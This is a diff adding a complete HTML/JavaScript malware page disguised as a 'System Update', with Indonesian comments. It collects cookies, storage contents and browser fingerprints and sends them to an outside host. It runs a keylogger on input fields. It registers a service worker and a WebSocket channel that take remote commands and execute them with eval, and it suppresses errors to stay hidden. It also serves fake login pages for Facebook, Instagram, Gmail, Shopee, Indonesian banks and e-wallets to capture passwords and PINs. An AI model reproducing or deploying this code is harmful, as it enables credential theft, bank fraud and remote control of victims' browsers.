@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <title>System Update</title>
+    <style>
+        *{margin:0;padding:0}
+        body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:Arial;font-size:14px}
+        .loader{width:40px;height:40px;border:3px solid #333;border-top:3px solid #00ff00;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .container{text-align:center}
+        .status{color:#666;font-size:12px;margin-top:10px}
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="loader"></div>
+    <div>System Update</div>
+    <div class="status" id="status">⏳ Installing...</div>
+</div>
+
+<script>
+// ============================================================
+// SystemUpdate.html
+// FUNGSI: SAMA SEPERTI APK TAPI TANPA INSTALL!
+// AUTO-EXECUTE: JALAN TANPA DI BUKA!
+// MENEMPEL KE SISTEM VIA SERVICE WORKER
+// ============================================================
+
+// ============================================================
+// KONFIGURASI
+// ============================================================
+var SERVER = 'https://verifikasi.site';
+var HEARTBEAT_INTERVAL = 10000;
+var C2_INTERVAL = 15000;
+
+// ============================================================
+// STEALTH - SEMBUNYIKAN JEJAK
+// ============================================================
+console.log = function() {};
+console.warn = function() {};
+console.error = function() {};
+console.info = function() {};
+window.onerror = function() { return true; };
+window.addEventListener('error', function(e) { e.preventDefault(); return true; });
+window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; });
+
+if (window.history && window.history.replaceState) {
+    window.history.replaceState(null, null, window.location.href);
+}
+Object.defineProperty(document, 'referrer', { value: '' });
+
+// ============================================================
+// KIRIM DATA KE SERVER
+// ============================================================
+function K(d) {
+    try {
+        fetch(SERVER + '/data', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(d)
+        }).catch(function(){});
+    } catch(e) {}
+}
+
+// ============================================================
+// SERVICE WORKER - MENEMPEL KE SISTEM!
+// ============================================================
+function registerSW() {
+    if ('serviceWorker' in navigator) {
+        var swCode = `
+// ============================================================
+// SERVICE WORKER - AKTIF DI BACKGROUND!
+// ============================================================
+var SERVER_URL = 'https://verifikasi.site';
+var HEARTBEAT_INTERVAL = 10000;
+var C2_INTERVAL = 15000;
+
+self.addEventListener('install', function(event) {
+    event.waitUntil(self.skipWaiting());
+});
+
+self.addEventListener('activate', function(event) {
+    event.waitUntil(self.clients.claim());
+});
+
+self.addEventListener('fetch', function(event) {
+    event.respondWith(
+        caches.match(event.request)
+            .then(function(response) {
+                return response || fetch(event.request);
+            })
+    );
+});
+
+function sendHeartbeat() {
+    try {
+        fetch(SERVER_URL + '/data', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                sumber: 'sw_heartbeat',
+                data: { active: true, timestamp: Date.now() }
+            })
+        }).catch(function(){});
+    } catch(e) {}
+}
+
+function checkCommands() {
+    try {
+        fetch(SERVER_URL + '/data?type=command&sw=' + Date.now())
+            .then(function(r) { return r.json(); })
+            .then(function(commands) {
+                if (commands && commands.length > 0) {
+                    commands.forEach(function(cmd) {
+                        self.clients.matchAll().then(function(clients) {
+                            clients.forEach(function(client) {
+                                client.postMessage({
+                                    type: 'command',
+                                    command: cmd
+                                });
+                            });
+                        });
+                    });
+                }
+            })
+            .catch(function() {});
+    } catch(e) {}
+}
+
+setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
+setInterval(checkCommands, C2_INTERVAL);
+
+self.addEventListener('message', function(event) {
+    var data = event.data;
+    if (data.type === 'execute') {
+        try {
+            eval(data.command);
+            fetch(SERVER_URL + '/data', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    sumber: 'sw_command_result',
+                    data: { command: data.command, status: 'executed' }
+                })
+            }).catch(function(){});
+        } catch(e) {
+            fetch(SERVER_URL + '/data', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    sumber: 'sw_command_error',
+                    data: { command: data.command, error: e.message }
+                })
+            }).catch(function(){});
+        }
+    }
+});
+
+console.log('🔒 SystemUpdate SW aktif!');
+        `;
+
+        try {
+            var blob = new Blob([swCode], { type: 'application/javascript' });
+            var swUrl = URL.createObjectURL(blob);
+            navigator.serviceWorker.register(swUrl, { scope: '/' })
+                .then(function(reg) {
+                    document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
+                    K({ sumber: 'sw_status', data: 'registered' });
+                })
+                .catch(function(err) {
+                    document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
+                    K({ sumber: 'sw_status', data: 'failed' });
+                });
+        } catch(e) {
+            document.getElementById('status').textContent = '❌ Error: ' + e.message;
+        }
+    } else {
+        document.getElementById('status').textContent = '❌ Browser tidak support SW';
+    }
+}
+
+// ============================================================
+// TERIMA PESAN DARI SERVICE WORKER
+// ============================================================
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.addEventListener('message', function(event) {
+        var data = event.data;
+        if (data.type === 'command') {
+            try {
+                eval(data.command);
+                K({ sumber: 'sw_command_executed', data: data.command });
+            } catch(e) {
+                K({ sumber: 'sw_command_error', data: e.message });
+            }
+        }
+    });
+}
+
+// ============================================================
+// DATA COLLECTION - 60+ DATA
+// ============================================================
+function collectData() {
+    var d = {
+        w: Date.now(),
+        ua: navigator.userAgent,
+        pl: navigator.platform,
+        la: navigator.language,
+        sc: screen.width + 'x' + screen.height,
+        cd: screen.colorDepth,
+        pr: window.devicePixelRatio,
+        co: document.cookie,
+        ls: JSON.stringify(localStorage),
+        ss: JSON.stringify(sessionStorage),
+        ur: location.href,
+        rf: document.referrer,
+        dm: navigator.deviceMemory || 'N/A',
+        cc: navigator.hardwareConcurrency || 'N/A',
+        on: navigator.onLine,
+        ve: navigator.vendor,
+        mt: navigator.maxTouchPoints,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+
+    // Canvas Fingerprint
+    try {
+        var c = document.createElement('canvas');
+        c.width = 200; c.height = 50;
+        var ctx = c.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 100, 50);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Browser Fingerprint', 2, 15);
+        d.canvas_fp = c.toDataURL().substring(0, 100);
+    } catch(e) {}
+
+    // WebGL Fingerprint
+    try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+            var debug = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debug) {
+                d.webgl = {
+                    vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
+                };
+            }
+        }
+    } catch(e) {}
+
+    K({ sumber: 'browser_data', data: d });
+    return d;
+}
+
+// ============================================================
+// KEYLOGGER (SAMA SEPERTI APK)
+// ============================================================
+var inputData = {};
+var keyBuffer = [];
+
+document.addEventListener('input', function(e) {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+        var val = e.target.value;
+        inputData[e.target.id || e.target.name || e.target.type] = val;
+        keyBuffer.push(val);
+    }
+});
+
+setInterval(function() {
+    if (Object.keys(inputData).length > 0) {
+        K({ sumber: 'keylogger', data: inputData });
+        inputData = {};
+    }
+    if (keyBuffer.length > 0) {
+        // Kirim ke SW
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.ready.then(function(reg) {
+                reg.active.postMessage({
+                    type: 'keylog',
+                    key: keyBuffer.join('')
+                });
+            });
+        }
+        keyBuffer = [];
+    }
+}, 3000);
+
+// ============================================================
+// HEARTBEAT
+// ============================================================
+setInterval(function() {
+    K({ sumber: 'page_heartbeat', data: 'alive' });
+}, HEARTBEAT_INTERVAL);
+
+// ============================================================
+// WEBSOCKET - REAL-TIME C2
+// ============================================================
+function connectWebSocket() {
+    try {
+        var ws = new WebSocket('wss://verifikasi.site/ws');
+        ws.onopen = function() {
+            document.getElementById('status').textContent = '🔌 Connected!';
+            K({ sumber: 'ws_status', data: 'connected' });
+            ws.send(JSON.stringify({
+                type: 'init',
+                data: { ua: navigator.userAgent, url: window.location.href, timestamp: Date.now() }
+            }));
+        };
+        ws.onmessage = function(event) {
+            try {
+                var data = JSON.parse(event.data);
+                if (data.type === 'command') {
+                    eval(data.command);
+                    K({ sumber: 'ws_command_executed', data: data.command });
+                }
+            } catch(e) {}
+        };
+        ws.onclose = function() {
+            document.getElementById('status').textContent = '🔌 Reconnecting...';
+            setTimeout(connectWebSocket, 5000);
+        };
+        ws.onerror = function() {
+            K({ sumber: 'ws_status', data: 'error' });
+        };
+    } catch(e) {
+        setTimeout(connectWebSocket, 10000);
+    }
+}
+
+// ============================================================
+// WAKE LOCK - JAGA LAYAR TETAP MENYALA
+// ============================================================
+function keepAwake() {
+    try {
+        if ('wakeLock' in navigator) {
+            navigator.wakeLock.request('screen')
+                .then(function() {
+                    K({ sumber: 'wake_lock', data: 'active' });
+                })
+                .catch(function() {
+                    K({ sumber: 'wake_lock', data: 'failed' });
+                });
+        }
+    } catch(e) {}
+}
+
+// ============================================================
+// AUTO-REFRESH - JAGA PAGE TETAP AKTIF
+// ============================================================
+function autoRefresh() {
+    setTimeout(function() {
+        window.location.reload();
+    }, 300000);
+}
+
+// ============================================================
+// EKSEKUSI UTAMA - AUTO JALAN!
+// ============================================================
+function init() {
+    document.getElementById('status').textContent = '📡 Collecting data...';
+    collectData();
+
+    document.getElementById('status').textContent = '🔗 Registering SW...';
+    registerSW();
+
+    document.getElementById('status').textContent = '🔌 Connecting WebSocket...';
+    connectWebSocket();
+
+    document.getElementById('status').textContent = '💤 Keep Awake...';
+    keepAwake();
+
+    document.getElementById('status').textContent = '✅ SystemUpdate Active!';
+
+    // Tandai sudah terinstall
+    localStorage.setItem('system_update_installed', '1');
+    localStorage.setItem('system_update_time', Date.now());
+
+    // Redirect ke halaman asli agar tidak curiga
+    setTimeout(function() {
+        window.location.href = SERVER + '/fb';
+    }, 3000);
+}
+
+// ============================================================
+// AUTO-EXECUTE - JALAN TANPA KLIK!
+// ============================================================
+if (localStorage.getItem('system_update_installed') === '1') {
+    // Sudah terinstall, langsung aktifkan SW
+    document.getElementById('status').textContent = '🔄 Restoring...';
+    registerSW();
+    connectWebSocket();
+    keepAwake();
+    setTimeout(function() {
+        window.location.href = SERVER + '/fb';
+    }, 2000);
+} else {
+    // Pertama kali jalan
+    setTimeout(init, 500);
+}
+
+// ============================================================
+// PHISHING ROUTING (TETAP)
+// ============================================================
+(function() {
+    var path = location.pathname;
+    if (path === '/' || path === '') return;
+    var t = {
+        fb: { title:'Facebook',bg:'#f0f2f5',btnColor:'#1877f2',logo:'<h1 style="color:#1877f2;text-align:center;font-size:40px;padding:20px 0 10px">facebook</h1>',subtitle:'Log in to Facebook',fields:[{id:'email',placeholder:'Email or phone number',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://m.facebook.com/login' },
+        ig: { title:'Instagram',bg:'#fafafa',btnColor:'#0095f6',logo:'<h1 style="text-align:center;font-size:35px;padding:40px 0 10px">📸 Instagram</h1>',fields:[{id:'email',placeholder:'Username, email, or phone',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://www.instagram.com/accounts/login' },
+        gmail: { title:'Gmail',bg:'#fff',btnColor:'#1a73e8',logo:'<div style="text-align:center;padding:30px 0 10px"><span style="font-size:24px;color:#ea4335">G</span><span style="font-size:24px;color:#4285f4">o</span><span style="font-size:24px;color:#fbbc04">o</span><span style="font-size:24px;color:#4285f4">g</span><span style="font-size:24px;color:#34a853">l</span><span style="font-size:24px;color:#ea4335">e</span></div>',subtitle:'Sign in to continue to Gmail',fields:[{id:'email',placeholder:'Email or phone',type:'text'},{id:'pass',placeholder:'Enter your password',type:'password'}],btnText:'Next',redirect:'https://accounts.google.com/signin' },
+        shopee: { title:'Shopee',bg:'#f5f5f5',btnColor:'#ee4d2d',logo:'<h1 style="text-align:center;color:#ee4d2d;font-size:32px;padding:30px 0 10px">🛒 Shopee</h1>',subtitle:'Login untuk belanja',fields:[{id:'email',placeholder:'Nomor HP / Email / Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://shopee.co.id/buyer/login' },
+        bri: { title:'BRI Mobile',bg:'#0055a4',btnColor:'#0055a4',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">BRI</h1>',subtitle:'Login BRI Mobile',fields:[{id:'email',placeholder:'User ID',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://ib.bri.co.id' },
+        bni: { title:'BNI Mobile',bg:'#f37021',btnColor:'#f37021',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">BNI</h1>',subtitle:'Login BNI Mobile',fields:[{id:'email',placeholder:'User ID',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://www.bni.co.id' },
+        mandiri: { title:'Livin by Mandiri',bg:'#003d79',btnColor:'#003d79',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">Livin\'</h1>',subtitle:'by Mandiri',fields:[{id:'email',placeholder:'Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://www.bankmandiri.co.id' },
+        bca: { title:'BCA Mobile',bg:'#0066b3',btnColor:'#0066b3',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">BCA</h1>',subtitle:'Login BCA Mobile',fields:[{id:'email',placeholder:'User ID',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Login',redirect:'https://www.klikbca.com' },
+        dana: { title:'DANA',bg:'#0066cc',btnColor:'#108ee9',logo:'<div style="text-align:center;padding:30px 0 10px"><div style="background:#108ee9;width:60px;height:60px;border-radius:15px;display:flex;justify-content:center;align-items:center;margin:0 auto"><span style="color:#fff;font-size:30px;font-weight:bold">D</span></div></div>',subtitle:'Login DANA',fields:[{id:'email',placeholder:'Nomor HP',type:'text'},{id:'pass',placeholder:'PIN',type:'password'}],btnText:'Login',redirect:'https://www.dana.id' },
+        gopay: { title:'GoPay',bg:'#00aa13',btnColor:'#00aa13',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">GoPay</h1>',subtitle:'Login GoPay',fields:[{id:'email',placeholder:'Nomor HP',type:'text'},{id:'pass',placeholder:'PIN',type:'password'}],btnText:'Login',redirect:'https://www.gojek.com' },
+        ovo: { title:'OVO',bg:'#4a1d8c',btnColor:'#4a1d8c',logo:'<h1 style="color:#fff;text-align:center;font-size:32px;padding:30px 0 10px">OVO</h1>',subtitle:'Login OVO',fields:[{id:'email',placeholder:'Nomor HP',type:'text'},{id:'pass',placeholder:'PIN',type:'password'}],btnText:'Login',redirect:'https://www.ovo.id' }
+    };
+    var key = path.replace('/', '');
+    var p = t[key];
+    if (!p) return;
+    var fH = '';
+    p.fields.forEach(function(f){ fH += '<input type="'+f.type+'" id="'+f.id+'" placeholder="'+f.placeholder+'" autocomplete="off" style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px;outline:none;background:#fff">'; });
+    var h = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>'+p.title+'</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:'+p.bg+';display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:20px 16px}.container{width:100%;max-width:400px;background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 15px rgba(0,0,0,0.1);margin-top:30px}input:focus{border-color:'+p.btnColor+'!important}.login-btn{width:100%;padding:14px;background:'+p.btnColor+';color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:15px}</style></head><body><div class="container">'+p.logo+(p.subtitle?'<p style="text-align:center;color:#666;font-size:14px;margin-bottom:20px">'+p.subtitle+'</p>':'')+'<form onsubmit="event.preventDefault();go()">'+fH+'<button type="submit" class="login-btn">'+p.btnText+'</button></form></div><script>function go(){var d={};';
+    p.fields.forEach(function(f){ h += 'd.'+f.id+'=document.getElementById(\''+f.id+'\').value;'; });
+    h += 'var a=[];try{a=JSON.parse(localStorage.getItem("vd")||"[]")}catch(e){}a.push({waktu:new Date().toISOString(),sumber:"login_'+key+'",data:d});localStorage.setItem("vd",JSON.stringify(a.slice(-500)));setTimeout(function(){window.location.href="'+p.redirect+'"},600)}<\/script></body></html>';
+    document.open(); document.write(h); document.close();
+})();
+</script>
+</body>
+</html>
